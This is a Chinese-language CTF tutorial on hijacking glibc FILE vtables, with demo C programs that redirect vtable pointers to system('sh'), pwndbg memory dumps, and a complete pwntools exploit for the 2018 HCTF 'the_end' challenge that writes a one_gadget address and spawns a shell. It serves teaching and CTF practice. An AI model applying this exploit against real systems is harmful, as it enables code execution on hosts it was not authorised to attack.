# 僞造vtable劫持程序流程


## 簡介

前面我們介紹了Linux中文件流的特性（FILE），我們可以得知Linux中的一些常見的IO操作函數都需要經過FILE結構進行處理。尤其是_IO_FILE_plus結構中存在vtable，一些函數會取出vtable中的指針進行調用。

因此僞造vtable劫持程序流程的中心思想就是針對_IO_FILE_plus的vtable動手腳，通過把vtable指向我們控制的內存，並在其中佈置函數指針來實現。


因此vtable劫持分爲兩種，一種是直接改寫vtable中的函數指針，通過任意地址寫就可以實現。另一種是覆蓋vtable的指針指向我們控制的內存，然後在其中佈置函數指針。

## 實踐


這裏演示了修改vtable中的指針，首先需要知道_IO_FILE_plus位於哪裏，對於fopen的情況下是位於堆內存，對於stdin\stdout\stderr是位於libc.so中。

```
int main(void)
{
    FILE *fp;
    long long *vtable_ptr;
    fp=fopen("123.txt","rw");
    vtable_ptr=*(long long*)((long long)fp+0xd8);     //get vtable
    
    vtable_ptr[7]=0x41414141 //xsputn

    printf("call 0x41414141");
}
```

根據vtable在_IO_FILE_plus的偏移得到vtable的地址，在64位系統下偏移是0xd8。之後需要搞清楚欲劫持的IO函數會調用vtable中的哪個函數。關於IO函數調用vtable的情況已經在FILE結構介紹一節給出了，知道了printf會調用vtable中的xsputn，並且xsputn的是vtable中第八項之後就可以寫入這個指針進行劫持。

並且在xsputn等vtable函數進行調用時，傳入的第一個參數其實是對應的_IO_FILE_plus地址。比如這例子調用printf，傳遞給vtable的第一個參數就是_IO_2_1_stdout_的地址。

利用這點可以實現給劫持的vtable函數傳參，比如


```
#define system_ptr 0x7ffff7a52390;

int main(void)
{
    FILE *fp;
    long long *vtable_ptr;
    fp=fopen("123.txt","rw");
    vtable_ptr=*(long long*)((long long)fp+0xd8);     //get vtable
    
    memcopy(fp,"sh",3);
    
    vtable_ptr[7]=system_ptr //xsputn
    

    fwrite("hi",2,1,fp);
}
```



但是在目前libc2.23版本下，位於libc數據段的vtable是不可以進行寫入的。不過，通過在可控的內存中僞造vtable的方法依然可以實現利用。

```
#define system_ptr 0x7ffff7a52390;

int main(void)
{
    FILE *fp;
    long long *vtable_addr,*fake_vtable;
    
    fp=fopen("123.txt","rw");
    fake_vtable=malloc(0x40);
    
    vtable_addr=(long long *)((long long)fp+0xd8);     //vtable offset
    
    vtable_addr[0]=(long long)fake_vtable;
    
    memcpy(fp,"sh",3);
    
    fake_vtable[7]=system_ptr; //xsputn
    
    fwrite("hi",2,1,fp);
}
```

我們首先分配一款內存來存放僞造的vtable，之後修改_IO_FILE_plus的vtable指針指向這塊內存。因爲vtable中的指針我們放置的是system函數的地址，因此需要傳遞參數"/bin/sh"或"sh"。

因爲vtable中的函數調用時會把對應的_IO_FILE_plus指針作爲第一個參數傳遞，因此這裏我們把"sh"寫入_IO_FILE_plus頭部。之後對fwrite的調用就會經過我們僞造的vtable執行system("sh")。

同樣，如果程序中不存在fopen等函數創建的_IO_FILE時，也可以選擇stdin\stdout\stderr等位於libc.so中的_IO_FILE，這些流在printf\scanf等函數中就會被使用到。在libc2.23之前，這些vtable是可以寫入並且不存在其他檢測的。

```
print &_IO_2_1_stdin_
$2 = (struct _IO_FILE_plus *) 0x7ffff7dd18e0 <_IO_2_1_stdin_>

0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so
```

## 2018 HCTF the_end

[題目鏈接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/io-file/2018_hctf_the_end/)

### 基本信息

```
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  signed int i; // [rsp+4h] [rbp-Ch]
  void *buf; // [rsp+8h] [rbp-8h]

  sleep(0);
  printf("here is a gift %p, good luck ;)\n", &sleep);
  fflush(_bss_start);
  close(1);
  close(2);
  for ( i = 0; i <= 4; ++i )
  {
    read(0, &buf, 8uLL);
    read(0, buf, 1uLL);
  }
  exit(1337);
}
```

分析題目，利用點很明確在 main 函數中，且：

- 除了 canary 保護全開
- libc 基地址和 libc 版本
- 能夠任意位置寫 5 字節

### 思路：

- 利用的是在程序調用 `exit` 後，會遍歷 `_IO_list_all` ，調用 `_IO_2_1_stdout_` 下的 `vtable` 中 `_setbuf` 函數。
- 可以先修改兩個字節在當前 `vtable` 附近僞造一個 `fake_vtable` ，然後使用 3 個字節修改 `fake_vtable` 中 `_setbuf` 的內容爲 `one_gadget`。

我們先調試找出 `_IO_2_1_stdout_` 和 libc 的偏移，這裏很蠢的地方是我最初是在 gdb 中搜索相關符號，但是其實找出的地址是 `_IO_2_1_stdout_` 這個符號所在的位置，而不是其在 libc 數據段上的位置，我們藉助 ida 或者 libcsearch 工具找出 `vtables` 偏移 `0x3C56F8` 如下：

```
.data:00000000003C56F8                 dq offset _IO_file_jumps  // vtables
.data:00000000003C5700                 public stderr
.data:00000000003C5700 stderr          dq offset _IO_2_1_stderr_
.data:00000000003C5700                                         ; DATA XREF: LOAD:000000000000BAF0↑o
.data:00000000003C5700                                         ; fclose+F2↑r ...
.data:00000000003C5708                 public stdout
.data:00000000003C5708 stdout          dq offset _IO_2_1_stdout_
.data:00000000003C5708                                         ; DATA XREF: LOAD:0000000000009F48↑o
.data:00000000003C5708                                         ; fclose+E9↑r ...
.data:00000000003C5710                 public stdin
.data:00000000003C5710 stdin           dq offset _IO_2_1_stdin_
.data:00000000003C5710                                         ; DATA XREF: LOAD:0000000000006DF8↑o
.data:00000000003C5710                                         ; fclose:loc_6D340↑r ...
.data:00000000003C5718                 dq offset sub_20B70
.data:00000000003C5718 _data           ends
.data:00000000003C5718
.bss:00000000003C5720 ; ===========================================================================
```

我們查看下虛表內容：

```
pwndbg> x /30gx 0x7f41d9c026f8
0x7f41d9c026f8 <_IO_2_1_stdout_+216>:	0x00007f41d9c006e0	0x00007f41d9c02540
0x7f41d9c02708 <stdout>:	0x00007f41d9c02620	0x00007f41d9c018e0
0x7f41d9c02718 <DW.ref.__gcc_personality_v0>:	0x00007f41d985db70	0x0000000000000000
0x7f41d9c02728 <string_space>:	0x0000000000000000	0x0000000000000000
0x7f41d9c02738 <__printf_va_arg_table>:	0x0000000000000000	0x0000000000000000
0x7f41d9c02748 <transitions>:	0x0000000000000000	0x0000000000000000
0x7f41d9c02758 <buffer>:	0x0000000000000000	0x0000000000000000
0x7f41d9c02768 <buffer>:	0x0000000000000000	0x0000000000000000
0x7f41d9c02778 <buffer>:	0x0000000000000000	0x0000000000000000
0x7f41d9c02788 <buffer>:	0x0000000000000000	0x0000000000000000
0x7f41d9c02798 <getttyname_name>:	0x0000000000000000	0x0000000000000000
0x7f41d9c027a8 <fcvt_bufptr>:	0x0000000000000000	0x0000000000000000
0x7f41d9c027b8 <buffer>:	0x0000000000000000	0x0000000000000000
0x7f41d9c027c8 <buffer>:	0x0000000000000000	0x0000000000000000
0x7f41d9c027d8 <buffer>:	0x0000000000000000	0x0000000000000000
```
然後此時在虛表附近尋找一個 `fake_vtable`，需滿足以下條件： 

- `fake_vtable_addr` + 0x58 = `libc_base` + `off_set_3`
- 其中 0x58 根據下表查處是 `set_buf` 在虛表的偏移

```
void * funcs[] = {
1 NULL, // "extra word"
2 NULL, // DUMMY
3 exit, // finish
4 NULL, // overflow
5 NULL, // underflow
6 NULL, // uflow
7 NULL, // pbackfail
8 NULL, // xsputn #printf
9 NULL, // xsgetn
10 NULL, // seekoff
11 NULL, // seekpos
12 NULL, // setbuf
13 NULL, // sync
14 NULL, // doallocate
15 NULL, // read
16 NULL, // write
17 NULL, // seek
18 pwn, // close
19 NULL, // stat
20 NULL, // showmanyc
21 NULL, // imbue
};
```
我這裏選擇了以下地址作爲 `fake_vtable` ：

```
pwndbg> x /60gx 0x7f41d9c02500
0x7f41d9c02500 <_nl_global_locale+224>:	0x00007f41d99cb997	0x0000000000000000
0x7f41d9c02510:	0x0000000000000000	0x0000000000000000
0x7f41d9c02520 <_IO_list_all>:	0x00007f41d9c02540	0x0000000000000000
0x7f41d9c02530:	0x0000000000000000	0x0000000000000000
0x7f41d9c02540 <_IO_2_1_stderr_>:	0x00000000fbad2086	0x0000000000000000
0x7f41d9c02550 <_IO_2_1_stderr_+16>:	0x0000000000000000	0x0000000000000000
0x7f41d9c02560 <_IO_2_1_stderr_+32>:	0x0000000000000000	0x0000000000000000
0x7f41d9c02570 <_IO_2_1_stderr_+48>:	0x0000000000000000	0x0000000000000000
0x7f41d9c02580 <_IO_2_1_stderr_+64>:	0x0000000000000000	0x0000000000000000
0x7f41d9c02590 <_IO_2_1_stderr_+80>:	0x0000000000000000	0x0000000000000000
0x7f41d9c025a0 <_IO_2_1_stderr_+96>:	0x0000000000000000	0x00007f41d9c02620
0x7f41d9c025b0 <_IO_2_1_stderr_+112>:	0x0000000000000002	0xffffffffffffffff
0x7f41d9c025c0 <_IO_2_1_stderr_+128>:	0x0000000000000000	0x00007f41d9c03770
0x7f41d9c025d0 <_IO_2_1_stderr_+144>:	0xffffffffffffffff	0x0000000000000000
0x7f41d9c025e0 <_IO_2_1_stderr_+160>:	0x00007f41d9c01660	0x0000000000000000
0x7f41d9c025f0 <_IO_2_1_stderr_+176>:	0x0000000000000000	0x0000000000000000
0x7f41d9c02600 <_IO_2_1_stderr_+192>:	0x0000000000000000	0x0000000000000000
0x7f41d9c02610 <_IO_2_1_stderr_+208>:	0x0000000000000000	0x00007f41d9c006e0
0x7f41d9c02620 <_IO_2_1_stdout_>:	0x00000000fbad2a84	0x00005582e351c010
0x7f41d9c02630 <_IO_2_1_stdout_+16>:	0x00005582e351c010	0x00005582e351c010
0x7f41d9c02640 <_IO_2_1_stdout_+32>:	0x00005582e351c010	0x00005582e351c010
0x7f41d9c02650 <_IO_2_1_stdout_+48>:	0x00005582e351c010	0x00005582e351c010
0x7f41d9c02660 <_IO_2_1_stdout_+64>:	0x00005582e351c410	0x0000000000000000
0x7f41d9c02670 <_IO_2_1_stdout_+80>:	0x0000000000000000	0x0000000000000000
0x7f41d9c02680 <_IO_2_1_stdout_+96>:	0x0000000000000000	0x00007f41d9c018e0
0x7f41d9c02690 <_IO_2_1_stdout_+112>:	0x0000000000000001	0xffffffffffffffff
0x7f41d9c026a0 <_IO_2_1_stdout_+128>:	0x0000000000000000	0x00007f41d9c03780
0x7f41d9c026b0 <_IO_2_1_stdout_+144>:	0xffffffffffffffff	0x0000000000000000
0x7f41d9c026c0 <_IO_2_1_stdout_+160>:	0x00007f41d9c017a0	0x0000000000000000
0x7f41d9c026d0 <_IO_2_1_stdout_+176>:	0x0000000000000000	0x0000000000000000
pwndbg> distance 0x7f41d9c025e0 0x7f41d983d000
0x7f41d9c025e0->0x7f41d983d000 is -0x3c55e0 bytes (-0x78abc words)
pwndbg> p 0x7f41d9c025e0 -0x58
$10 = 0x7f41d9c02588
pwndbg> distance 0x7f41d9c02588 0x7f41d983d000
0x7f41d9c02588->0x7f41d983d000 is -0x3c5588 bytes (-0x78ab1 words)
pwndbg> distance  0x7f41d9c025e0 0x7f41d983d000
0x7f41d9c025e0->0x7f41d983d000 is -0x3c55e0 bytes (-0x78abc words)
```

最終的利用腳本如下：

```
from pwn import *
context.log_level="debug"

libc=ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
# p = process('the_end')
p = remote('127.0.0.1',1234)

rem = 0
if rem ==1:
    p = remote('150.109.44.250',20002)
    p.recvuntil('Input your token:')
    p.sendline('RyyWrOLHepeGXDy6g9gJ5PnXsBfxQ5uU')

sleep_ad = p.recvuntil(', good luck',drop=True).split(' ')[-1]

libc_base = long(sleep_ad,16) - libc.symbols['sleep']
one_gadget = libc_base + 0xf02b0
vtables =     libc_base + 0x3C56F8

fake_vtable = libc_base + 0x3c5588
target_addr = libc_base + 0x3c55e0

print 'libc_base: ',hex(libc_base)
print 'one_gadget:',hex(one_gadget)
print 'exit_addr:',hex(libc_base + libc.symbols['exit'])

# gdb.attach(p)

for i in range(2):
	p.send(p64(vtables+i))
	p.send(p64(fake_vtable)[i])


for i in range(3):
    p.send(p64(target_addr+i))
    p.send(p64(one_gadget)[i])

p.sendline("exec /bin/sh 1>&0")

p.interactive()
```

